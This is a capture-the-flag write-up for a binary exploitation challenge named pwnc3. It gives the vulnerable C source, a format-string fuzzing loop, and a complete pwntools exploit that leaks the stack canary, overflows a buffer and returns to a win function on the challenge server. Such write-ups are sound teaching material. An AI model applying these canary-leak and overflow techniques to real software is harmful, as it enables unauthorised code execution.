---
description: Binary Exploitation
---

# pwnc3

> A vulnerable program could you lead to the flag.
>
> By: @4nimanegra

{% file src="../../.gitbook/assets/pwn (2)" %}

{% file src="../../.gitbook/assets/pwn (2).c" %}

```
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

Another simple challenge that uses an actual canary this time. Since there isn't any visible variables to overwrite, I had to use the regular way to bypass canary, which requires me to leak it using Format String Exploits. Luckily, the program gives a lot of chances to scout the correct canary!

```c
void pwnme(){

	char name[32];
	char surname[32];

	printf("Insert your name: ");

	scanf("%s",name);

	printf("Welcome home ");
	printf(name);
	printf("\n");

	printf("Insert your first surname: ");

	scanf("%s",surname);

	printf("Insert your second surname: ");

	scanf("%s",surname);


	printf("Your user has been added!!!\n");

}
```

Since finding the correct canary takes time, I used a loop to fuzz through a lot of them at once:

```python
# FUZZING for canary
for i in range(0, 40):
    io = start()
    io.clean()
    io.sendline(bytes(f'%{i}$p', 'utf-8'))
    log.info(f'{i} Leaking stack: {io.recvline()}')
    io.close()
```

Knowing the basics of what canary addresses look like based on [https://ir0nstone.gitbook.io/notes/binexp/stack/canaries](https://ir0nstone.gitbook.io/notes/binexp/stack/canaries), I found the canary at `$15p`. And with that, just do the usual overwriting variables technique with the leaked canary and return to the win function:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -*- template: winterbitia -*-

# ====================
# -- PWNTOOLS SETUP --
# ====================

from pwn import *

exe = context.binary = ELF(args.EXE or 'pwn')
trm = context.terminal = ['tmux', 'splitw', '-h']

host = args.HOST or '130.206.158.146'
port = int(args.PORT or 42013)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
# tbreak main
b *pwnme+60
b *pwnme+231
continue
'''.format(**locals())

# =======================
# -- EXPLOIT GOES HERE --
# =======================

RET = 0x000000000040111f
WIN = 0x00000000004011a6

io = start()
io.clean()
io.sendline(b'%15$p')
io.recvuntil(b'home ')

# leak
leak = io.recvline().strip()
leak = int(leak, 16)
log.info(f'Leaked address: {hex(leak)}')

io.sendline(b'winter')
io.clean()

payload = flat(
    cyclic(40, n=8),
    leak,
    cyclic(8, n=8),
    RET,
    WIN
)

io.sendline(payload)

io.interactive()
```

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
